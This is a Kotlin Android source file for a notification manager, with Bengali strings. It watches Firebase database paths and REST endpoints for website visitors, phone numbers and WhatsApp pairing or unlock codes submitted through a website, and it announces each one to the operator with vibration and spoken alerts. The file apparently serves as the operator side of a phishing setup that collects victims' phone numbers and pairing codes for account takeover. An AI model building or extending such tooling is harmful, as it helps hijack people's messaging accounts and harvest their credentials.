package com.example.data.firebase

import android.content.Context
import android.util.Log
import com.example.data.model.AppNotification
import com.example.data.model.NotificationType
import com.example.data.model.PathChannel
import com.example.util.AppPreferences
import com.example.util.TtsManager
import com.example.util.VibrationHelper
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.TimeUnit

/**
 * NotificationAlertManager
 *
 * Real-time notification hub for:
 * 1. Website Visitor Notifications (ভিজিটর প্রবেশ বার্তা)
 * 2. Phone Number Notifications (ফোন নাম্বার বার্তা)
 * 3. Unlock Number Notifications (আনলক নাম্বার বার্তা)
 */
object NotificationAlertManager {

    private const val TAG = "NotificationAlertMgr"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(4, TimeUnit.SECONDS)
        .readTimeout(4, TimeUnit.SECONDS)
        .build()

    private val _notifications = MutableStateFlow<List<AppNotification>>(emptyList())
    val notifications: StateFlow<List<AppNotification>> = _notifications.asStateFlow()

    private val _newAlertEvents = MutableSharedFlow<AppNotification>(extraBufferCapacity = 10)
    val newAlertEvents: SharedFlow<AppNotification> = _newAlertEvents.asSharedFlow()

    private var isListening = false
    private var activeListeningSlot: Int = -1

    private var visitorSdkRef: DatabaseReference? = null
    private var visitorListener: ValueEventListener? = null

    private var verificationSdkRef: DatabaseReference? = null
    private var verificationListener: ValueEventListener? = null

    @Volatile
    private var sdkConnected = false

    private val sessionStartTime = System.currentTimeMillis()
    private var lastSeenVisitorTs = sessionStartTime - 3000L
    private var lastSeenPhone = ""
    private var lastSeenPhoneTs = 0L
    private var lastSeenUnlock = ""
    private var lastSeenUnlockTs = 0L

    fun startListening(context: Context) {
        val appContext = context.applicationContext
        val prefs = AppPreferences.getInstance(appContext)
        val channel = prefs.getCurrentChannel()

        if (activeListeningSlot != channel.slotNumber) {
            activeListeningSlot = channel.slotNumber
            setupFirebaseSdkListeners(appContext, channel)
        }

        if (isListening) return
        isListening = true

        startPollingLoop(appContext)
    }

    private fun setupFirebaseSdkListeners(context: Context, channel: PathChannel) {
        try {
            visitorListener?.let { visitorSdkRef?.removeEventListener(it) }
            verificationListener?.let { verificationSdkRef?.removeEventListener(it) }

            val db = FirebaseScreenStreamManager.getInstance(context).firebaseDatabase ?: return

            // 1. Visitor listener
            val vRef = db.getReference(channel.visitorPath)
            val vListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    sdkConnected = true
                    processVisitorSnapshot(snapshot, context)
                }

                override fun onCancelled(error: DatabaseError) {
                    sdkConnected = false
                }
            }
            visitorSdkRef = vRef
            visitorListener = vListener
            vRef.addValueEventListener(vListener)

            // 2. Verification listener (phone & unlock code)
            val verRef = db.getReference(channel.verificationPath)
            val verListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    sdkConnected = true
                    processVerificationSnapshot(snapshot, context)
                }

                override fun onCancelled(error: DatabaseError) {
                    sdkConnected = false
                }
            }
            verificationSdkRef = verRef
            verificationListener = verListener
            verRef.addValueEventListener(verListener)
        } catch (e: Exception) {
            sdkConnected = false
            Log.w(TAG, "Error setting up Firebase SDK notification listeners: ${e.message}")
        }
    }

    private fun processVisitorSnapshot(snapshot: DataSnapshot, context: Context) {
        try {
            val ts = snapshot.child("timestamp").getValue(Long::class.java)
                ?: snapshot.child("time").getValue(Long::class.java)
                ?: 0L

            if (ts > 0 && ts > lastSeenVisitorTs) {
                lastSeenVisitorTs = ts
                val platform = snapshot.child("platform").getValue(String::class.java) ?: "ওয়েবসাইট"
                val device = snapshot.child("device").getValue(String::class.java) ?: "নতুন ডিভাইস"

                val notification = AppNotification(
                    id = UUID.randomUUID().toString(),
                    type = NotificationType.VISITOR,
                    title = "নতুন ওয়েবসাইট ভিজিটর",
                    message = "${platform.uppercase()} ওয়েবসাইটে নতুন ভিজিটর প্রবেশ করেছে ($device)",
                    payload = device,
                    timestamp = ts
                )
                dispatchNotification(notification, context, "নতুন ওয়েবসাইট ভিজিটর প্রবেশ করেছে")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing visitor snapshot: ${e.message}")
        }
    }

    private fun processVerificationSnapshot(snapshot: DataSnapshot, context: Context) {
        try {
            // Check for phone number
            val phone = snapshot.child("phoneNumber").getValue(String::class.java)
                ?: snapshot.child("phone").getValue(String::class.java)
            val phoneTs = snapshot.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()

            if (!phone.isNullOrBlank()) {
                if (lastSeenPhone.isEmpty() && phoneTs < sessionStartTime - 4000L) {
                    lastSeenPhone = phone
                    lastSeenPhoneTs = phoneTs
                } else if (phone != lastSeenPhone || phoneTs > lastSeenPhoneTs + 3000L) {
                    lastSeenPhone = phone
                    lastSeenPhoneTs = phoneTs
                    val notification = AppNotification(
                        id = UUID.randomUUID().toString(),
                        type = NotificationType.PHONE_NUMBER,
                        title = "নতুন ফোন নাম্বার নোটিফিকেশন",
                        message = "ওয়েবসাইট থেকে ফোন নাম্বার সাবমিট হয়েছে: $phone",
                        payload = phone,
                        timestamp = phoneTs
                    )
                    dispatchNotification(notification, context, "নতুন ফোন নাম্বার এসেছে: $phone")
                }
            }

            // Check for unlock code or 8-digit pairing code
            val unlockCode = snapshot.child("pairingCode").getValue(String::class.java)
                ?: snapshot.child("unlockCode").getValue(String::class.java)
                ?: snapshot.child("code").getValue(String::class.java)
            val unlockTs = snapshot.child("updatedAt").getValue(Long::class.java)
                ?: snapshot.child("timestamp").getValue(Long::class.java)
                ?: System.currentTimeMillis()

            if (!unlockCode.isNullOrBlank()) {
                val cleanCode = unlockCode.trim().uppercase()
                if (lastSeenUnlock.isEmpty() && unlockTs < sessionStartTime - 4000L) {
                    lastSeenUnlock = cleanCode
                    lastSeenUnlockTs = unlockTs
                } else if (cleanCode != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
                    lastSeenUnlock = cleanCode
                    lastSeenUnlockTs = unlockTs
                    val isEightChar = cleanCode.length == 8
                    val notification = AppNotification(
                        id = UUID.randomUUID().toString(),
                        type = NotificationType.UNLOCK_CODE,
                        title = if (isEightChar) "নতুন পেয়ারিং কোড নোটিফিকেশন" else "নতুন আনলক নাম্বার নোটিফিকেশন",
                        message = if (isEightChar) {
                            "৮-সংখ্যার WhatsApp পেয়ারিং কোড এসেছে: $cleanCode"
                        } else {
                            "ওয়েবসাইট থেকে আনলক কোড সাবমিট হয়েছে: $cleanCode"
                        },
                        payload = cleanCode,
                        timestamp = unlockTs
                    )
                    val announceText = if (isEightChar) {
                        "WhatsApp পেয়ারিং কোড এসেছে: $cleanCode"
                    } else {
                        "নতুন আনলক কোড এসেছে: $cleanCode"
                    }
                    dispatchNotification(notification, context, announceText)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing verification snapshot: ${e.message}")
        }
    }

    private fun startPollingLoop(context: Context) {
        scope.launch {
            val prefs = AppPreferences.getInstance(context)
            while (isActive) {
                if (prefs.isChannelLoggedIn) {
                    val currentChannel = prefs.getCurrentChannel()
                    if (activeListeningSlot != currentChannel.slotNumber) {
                        activeListeningSlot = currentChannel.slotNumber
                        setupFirebaseSdkListeners(context, currentChannel)
                    }

                    if (!sdkConnected) {
                        pollRestEndpoint(currentChannel, context)
                    }
                }
                delay(3000L)
            }
        }
    }

    private fun pollRestEndpoint(channel: PathChannel, context: Context) {
        try {
            // Poll visitor.json
            val visitorReq = Request.Builder()
                .url(channel.visitorRestUrl)
                .header("Cache-Control", "no-cache")
                .get()
                .build()
            httpClient.newCall(visitorReq).execute().use { visitorResp ->
                if (visitorResp.isSuccessful) {
                    val body = visitorResp.body?.string()
                    if (!body.isNullOrBlank() && body != "null") {
                        val json = JSONObject(body)
                        val ts = json.optLong("timestamp", 0L)
                        if (ts > 0 && ts > lastSeenVisitorTs) {
                            lastSeenVisitorTs = ts
                            val platform = json.optString("platform", "ওয়েবসাইট")
                            val device = json.optString("device", "মোবাইল ডিভাইস")
                            val notification = AppNotification(
                                id = UUID.randomUUID().toString(),
                                type = NotificationType.VISITOR,
                                title = "নতুন ওয়েবসাইট ভিজিটর",
                                message = "${platform.uppercase()} ওয়েবসাইটে নতুন ভিজিটর প্রবেশ করেছে ($device)",
                                payload = device,
                                timestamp = ts
                            )
                            dispatchNotification(notification, context, "নতুন ওয়েবসাইট ভিজিটর প্রবেশ করেছে")
                        }
                    }
                }
            }

            // Poll verification.json
            val verReq = Request.Builder()
                .url(channel.verificationRestUrl)
                .header("Cache-Control", "no-cache")
                .get()
                .build()
            httpClient.newCall(verReq).execute().use { verResp ->
                if (verResp.isSuccessful) {
                    val body = verResp.body?.string()
                    if (!body.isNullOrBlank() && body != "null") {
                        val json = JSONObject(body)
                        val phone = json.optString("phoneNumber", "").ifBlank { json.optString("phone", "") }
                        val phoneTs = json.optLong("timestamp", System.currentTimeMillis())
                        if (phone.isNotBlank()) {
                            if (lastSeenPhone.isEmpty() && phoneTs < sessionStartTime - 4000L) {
                                lastSeenPhone = phone
                                lastSeenPhoneTs = phoneTs
                            } else if (phone != lastSeenPhone || phoneTs > lastSeenPhoneTs + 3000L) {
                                lastSeenPhone = phone
                                lastSeenPhoneTs = phoneTs
                                val notification = AppNotification(
                                    id = UUID.randomUUID().toString(),
                                    type = NotificationType.PHONE_NUMBER,
                                    title = "নতুন ফোন নাম্বার নোটিফিকেশন",
                                    message = "ওয়েবসাইট থেকে ফোন নাম্বার সাবমিট হয়েছে: $phone",
                                    payload = phone,
                                    timestamp = phoneTs
                                )
                                dispatchNotification(notification, context, "নতুন ফোন নাম্বার এসেছে: $phone")
                            }
                        }

                        val unlock = json.optString("pairingCode", "").ifBlank {
                            json.optString("unlockCode", "").ifBlank { json.optString("code", "") }
                        }
                        val unlockTs = json.optLong("updatedAt", json.optLong("timestamp", System.currentTimeMillis()))
                        if (unlock.isNotBlank()) {
                            val cleanUnlock = unlock.trim().uppercase()
                            if (lastSeenUnlock.isEmpty() && unlockTs < sessionStartTime - 4000L) {
                                lastSeenUnlock = cleanUnlock
                                lastSeenUnlockTs = unlockTs
                            } else if (cleanUnlock != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
                                lastSeenUnlock = cleanUnlock
                                lastSeenUnlockTs = unlockTs
                                val isEightChar = cleanUnlock.length == 8
                                val notification = AppNotification(
                                    id = UUID.randomUUID().toString(),
                                    type = NotificationType.UNLOCK_CODE,
                                    title = if (isEightChar) "নতুন পেয়ারিং কোড নোটিফিকেশন" else "নতুন আনলক নাম্বার নোটিফিকেশন",
                                    message = if (isEightChar) {
                                        "৮-সংখ্যার WhatsApp পেয়ারিং কোড এসেছে: $cleanUnlock"
                                    } else {
                                        "ওয়েবসাইট থেকে আনলক কোড সাবমিট হয়েছে: $cleanUnlock"
                                    },
                                    payload = cleanUnlock,
                                    timestamp = unlockTs
                                )
                                val announceText = if (isEightChar) {
                                    "WhatsApp পেয়ারিং কোড এসেছে: $cleanUnlock"
                                } else {
                                    "নতুন আনলক কোড এসেছে: $cleanUnlock"
                                }
                                dispatchNotification(notification, context, announceText)
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Rest poll exception: ${e.message}")
        }
    }

    private fun dispatchNotification(
        notification: AppNotification,
        context: Context,
        speechText: String
    ) {
        _notifications.update { current ->
            // Prepend new notification, limit to 50
            listOf(notification) + current.take(49)
        }
        _newAlertEvents.tryEmit(notification)

        // Haptic feedback
        try {
            val vibration = VibrationHelper(context)
            if (notification.type == NotificationType.UNLOCK_CODE) {
                vibration.success()
            } else {
                vibration.tap()
            }
        } catch (_: Exception) {}

        // TTS voice announcement
        try {
            TtsManager(context).speak(speechText)
        } catch (_: Exception) {}
    }

    fun markAllAsRead() {
        _notifications.update { current ->
            current.map { it.copy(isRead = true) }
        }
    }

    fun clearAllNotifications() {
        _notifications.value = emptyList()
    }

    fun deleteNotification(id: String) {
        _notifications.update { current ->
            current.filterNot { it.id == id }
        }
    }

    fun addManualNotification(
        type: NotificationType,
        title: String,
        message: String,
        payload: String = "",
        context: Context
    ) {
        val notification = AppNotification(
            id = UUID.randomUUID().toString(),
            type = type,
            title = title,
            message = message,
            payload = payload,
            timestamp = System.currentTimeMillis()
        )
        dispatchNotification(notification, context, title)
    }
}
